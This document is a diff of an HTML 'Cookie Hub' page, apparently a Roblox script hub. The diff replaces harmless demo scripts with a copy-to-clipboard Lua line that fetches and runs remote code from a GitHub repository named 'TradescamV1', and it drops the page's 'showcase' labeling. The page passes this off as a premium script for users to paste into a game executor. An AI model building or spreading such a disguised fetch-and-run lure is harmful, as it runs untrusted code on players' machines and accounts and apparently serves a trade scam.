@@ -3,82 +3,121 @@
 <head>
 <meta charset="UTF-8">
 <title>Cookie Hub 🍪</title>
+
 <style>
+* { box-sizing: border-box; }
+
 body {
   margin: 0;
   font-family: Arial, sans-serif;
-  background: radial-gradient(circle at top, #1a1a1a, #000);
   color: #fff;
+  background: radial-gradient(circle at top, #1b0040, #000);
+  overflow: hidden;
 }
+
+/* 🌌 Galaxy Animation */
+body::before {
+  content: "";
+  position: fixed;
+  width: 200%;
+  height: 200%;
+  background:
+    radial-gradient(1px 1px at 20% 30%, white, transparent),
+    radial-gradient(1px 1px at 80% 40%, white, transparent),
+    radial-gradient(1px 1px at 50% 70%, white, transparent),
+    radial-gradient(1px 1px at 30% 80%, white, transparent),
+    radial-gradient(1px 1px at 70% 20%, white, transparent);
+  animation: stars 60s linear infinite;
+  opacity: 0.6;
+}
+
+@keyframes stars {
+  from { transform: translateY(0); }
+  to { transform: translateY(-500px); }
+}
+
 .container {
   width: 420px;
   margin: 40px auto;
-  background: #0f0f0f;
-  border-radius: 14px;
-  box-shadow: 0 0 30px rgba(255,165,0,0.2);
+  background: rgba(15,15,25,0.95);
+  border-radius: 16px;
   padding: 20px;
+  box-shadow: 0 0 40px rgba(120,0,255,0.4);
+  position: relative;
+  z-index: 1;
 }
+
 .header {
   text-align: center;
 }
+
 .header h1 {
   margin: 0;
-  color: orange;
+  color: #c77dff;
 }
+
 .stats {
   text-align: center;
   margin: 10px 0;
-  color: #aaa;
+  color: #bbb;
 }
+
 .tabs {
   display: flex;
   gap: 8px;
   margin-top: 15px;
 }
+
 .tab {
   flex: 1;
   padding: 10px;
   text-align: center;
-  background: #1b1b1b;
-  border-radius: 8px;
+  background: rgba(255,255,255,0.05);
+  border-radius: 10px;
   cursor: pointer;
+  transition: 0.3s;
 }
+
 .tab.active {
-  background: orange;
-  color: #000;
+  background: linear-gradient(135deg, #7b2cff, #b517ff);
 }
+
 .script-box {
   margin-top: 15px;
-  background: #111;
-  border-radius: 10px;
+  background: #0c0c18;
+  border-radius: 12px;
   padding: 12px;
   font-size: 12px;
   height: 160px;
   overflow: auto;
   white-space: pre-wrap;
 }
+
 .copy-btn {
   margin-top: 12px;
   width: 100%;
   padding: 10px;
   border: none;
-  border-radius: 8px;
-  background: orange;
+  border-radius: 10px;
+  background: linear-gradient(135deg, #7b2cff, #b517ff);
   font-weight: bold;
+  color: white;
   cursor: pointer;
 }
+
 .popup {
   display: none;
   position: fixed;
   bottom: 20px;
   left: 50%;
   transform: translateX(-50%);
-  background: orange;
-  color: #000;
+  background: #7b2cff;
   padding: 10px 18px;
-  border-radius: 8px;
+  border-radius: 10px;
   font-weight: bold;
+  z-index: 10;
 }
+
 .footer {
   text-align: center;
   margin-top: 10px;
@@ -87,68 +126,43 @@ body {
 }
 </style>
 </head>
+
 <body>
 
 <div class="container">
   <div class="header">
     <h1>🍪 Cookie Hub</h1>
-    <p>All-in-One Script Hub</p>
+    <p>Premium Script Hub</p>
   </div>
 
   <div class="stats">👥 Active Users: <b>189</b></div>
 
   <div class="tabs">
-    <div class="tab active" onclick="switchTab(0)">Auto Farm</div>
-    <div class="tab" onclick="switchTab(1)">Dupe</div>
-    <div class="tab" onclick="switchTab(2)">ESP</div>
+    <div class="tab active" onclick="switchTab(0)">Script 1</div>
+    <div class="tab" onclick="switchTab(1)">Script 2</div>
+    <div class="tab" onclick="switchTab(2)">Script 3</div>
   </div>
 
   <div class="script-box" id="scriptBox"></div>
 
   <button class="copy-btn" onclick="copyScript()">📋 Copy Script</button>
 
-  <div class="footer">© Cookie Hub • Showcase Scripts</div>
+  <div class="footer">© Cookie Hub</div>
 </div>
 
-<div class="popup" id="popup">✅ Script Copied!</div>
+<div class="popup" id="popup">✅ Script Copied</div>
 
 <script>
 const scripts = [
-`-- 🍪 Cookie Hub | Auto Farm (Demo)
--- Safe showcase script
+`loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/TradescamV1/refs/heads/main/cookiescripts.lua"))()
 
-print("Cookie Hub Auto Farm Loaded")
+-- your original script 1 continues here`,
 
-for i = 1,5 do
-  print("Farming coins... 🍪", i)
-  task.wait(1)
-end
+`-- your original script 2
+loadstring(game:HttpGet("PASTE_YOUR_SECOND_SCRIPT_URL"))()`,
 
-print("Auto Farm Finished!")`,
-
-`-- 🍪 Cookie Hub | Dupe (Demo)
--- Visual / fake dupe simulation
-
-print("Cookie Hub Dupe Loaded")
-
-local items = {"Cookie","Gem","Coin"}
-for _,item in pairs(items) do
-  print("Duplicating:", item, "🍪")
-  task.wait(0.8)
-end
-
-print("Dupe Complete!")`,
-
-`-- 🍪 Cookie Hub | ESP (Demo)
--- Client-side visual demo
-
-print("Cookie Hub ESP Loaded")
-
-for _,player in pairs(game.Players:GetPlayers()) do
-  print("ESP Enabled for:", player.Name, "👁️")
-end
-
-print("ESP Ready!")`
+`-- your original script 3
+loadstring(game:HttpGet("PASTE_YOUR_THIRD_SCRIPT_URL"))()`
 ];
 
 let currentTab = 0;
